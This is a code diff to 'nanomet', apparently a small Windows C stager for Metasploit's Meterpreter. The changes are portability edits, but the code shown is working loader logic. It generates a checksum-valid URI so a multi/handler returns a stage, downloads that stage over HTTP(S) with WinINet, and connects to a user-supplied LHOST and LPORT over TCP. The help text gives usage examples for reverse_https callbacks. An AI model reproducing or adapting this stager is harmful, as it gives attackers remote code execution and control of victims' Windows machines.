@@ -33,10 +33,6 @@ either expressed or implied, of the FreeBSD Project.
 #include <windows.h>
 #include <stdio.h>
 
-#ifdef __MINGW32__
-#define MINGW
-#endif
-
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
 
@@ -46,11 +42,14 @@ unsigned short sPORT;
 unsigned char *buf;
 unsigned int bufSize;
 
-#ifdef MINGW
 typedef unsigned char bool;
-#define true 1
-#define false 0
-#define nullptr NULL
+
+#ifndef TRUE
+#define TRUE 1
+#endif
+
+#ifndef FALSE
+#define FALSE 0
 #endif
 
 // Functions ...
@@ -105,7 +104,7 @@ unsigned char* met_tcp(char* host, char* port, bool bind_tcp)
 
 	hostName = gethostbyname(host);
 
-	if (hostName == nullptr){
+	if (hostName == NULL){
 		err_exit("gethostbyname");
 	}
 
@@ -180,14 +179,21 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	// Variables
 	char URI[5] = { 0 };			//4 chars ... it can be any length actually.
 	char FullURL[6] = { 0 };	// FullURL is ("/" + URI)
-	unsigned char* buffer = nullptr;
+	unsigned char* buffer = NULL;
 	DWORD flags = 0;
 	int dwSecFlags = 0;
-
+	
+	HINTERNET hInternetOpen; 
+	HINTERNET hInternetConnect;
+	HINTERNET hHTTPOpenRequest;
+	bool bKeepReading;
+	DWORD dwBytesRead;
+	DWORD dwBytesWritten;
+	
 	//	Step 1: Calculate a random URI->URL with `valid` checksum; that is needed for the multi/handler to distinguish and identify various framework related requests "i.e. coming from stagers" ... we'll be asking for checksum==92 "INITM", which will get the patched stage in return. 
 	int checksum = 0;
 	srand(GetTickCount());
-	while (true)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
+	while (TRUE)				//Keep getting random values till we succeed, don't worry, computers are pretty fast and we're not asking for much.
 	{
 		gen_random(URI, 4);				//Generate a 4 char long random string ... it could be any length actually, but 4 sounds just fine.
 		checksum = TextChecksum8(URI);	//Get the 8-bit checksum of the random value
@@ -211,19 +217,19 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 	//	   InternetOpen, InternetConnect, HttpOpenRequest, HttpSendRequest, InternetReadFile.
 
 	//	3.1: HINTERNET InternetOpen(_In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
-	HINTERNET hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
+	hInternetOpen = InternetOpen("Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, NULL);
 	if (hInternetOpen == NULL){
 		err_exit("InternetOpen()");
 	}
 
 	// 3.2: InternetConnect
-	HINTERNET hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
+	hInternetConnect = InternetConnect(hInternetOpen, host, atoi(port), NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
 	if (hInternetConnect == NULL){
 		err_exit("InternetConnect()");
 	}
 
 	// 3.3: HttpOpenRequest
-	HINTERNET hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
+	hHTTPOpenRequest = HttpOpenRequest(hInternetConnect, "GET", FullURL, NULL, NULL, NULL, flags, NULL);
 	if (hHTTPOpenRequest == NULL){
 		err_exit("HttpOpenRequest()");
 	}
@@ -245,9 +251,9 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 
 	// 3.7: InternetReadFile: keep reading till nothing is left.
 
-	BOOL bKeepReading = true;
-	DWORD dwBytesRead = -1;
-	DWORD dwBytesWritten = 0;
+	bKeepReading = TRUE;
+	dwBytesRead = -1;
+	dwBytesWritten = 0;
 	while (bKeepReading && dwBytesRead != 0)
 	{
 		bKeepReading = InternetReadFile(hHTTPOpenRequest, (buffer + dwBytesWritten), 4096, &dwBytesRead);
@@ -267,21 +273,13 @@ unsigned char* rev_http(char* host, char* port, bool WithSSL){
 //	return wcstring;
 //}
 
-#ifdef MINGW
 int main (int argc, char *argv[])
-#else
-char* WcharToChar(wchar_t* orig){
-	size_t convertedChars = 0;
-	size_t origsize = wcslen(orig) + 1;
-	const size_t newsize = origsize * 2;
-	char *nstring = (char*)VirtualAlloc(NULL, newsize, MEM_COMMIT, PAGE_READWRITE);
-	wcstombs(nstring, orig, origsize);
-	return nstring;
-}
-
-int main()
-#endif
 {
+
+	char* TRANSPORT;
+	char* LHOST;
+	char* LPORT;
+
 	char helpText[] = "nanomet v0.1\ngithub.com/kost/nanomet\n\n"
 		"Usage: nanomet.exe [transport] LHOST LPORT\n"
 		"Available transports are as follows:\n"
@@ -292,37 +290,13 @@ int main()
 		"\nExample:\n"
 		"\"nanomet.exe 2 host.com 443\"\nwill use reverse_https and connect to host.com:443\n";
 
-#ifdef MINGW
 	if ((argc<=2) || (argc==2 && strcmp(argv[1],"--help")==0)) {
 		printf(helpText);
 		exit(-1);
 	}
-	char* TRANSPORT = argv[1];
-	char* LHOST = argv[2];
-	char* LPORT = argv[3];
-#else
-	LPWSTR *szArglist;
-	int nArgs;
-	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
-
-	// rudimentary error checking
-	if (NULL == szArglist) { // problem parsing?
-		err_exit("CommandLineToArgvW & GetCommandLineW");
-	}
-	else if (nArgs == 2 && !wcscmp(szArglist[1], L"--help")){ // looking for help?
-		printf(helpText);
-		exit(-1);
-	}
-	else if (nArgs != 4){ // less than 4 args?
-		printf(helpText);
-		err_exit("Invalid arguments count, should be 4");
-	}
-
-	// convert wchar_t to mb
-	char* TRANSPORT = WcharToChar(szArglist[1]);
-	char* LHOST = WcharToChar(szArglist[2]);
-	char* LPORT = WcharToChar(szArglist[3]);
-#endif
+	TRANSPORT = argv[1];
+	LHOST = argv[2];
+	LPORT = argv[3];
 	printf("T:%s H:%s P:%s\n", TRANSPORT, LHOST, LPORT);
 
 	// pick transport ...
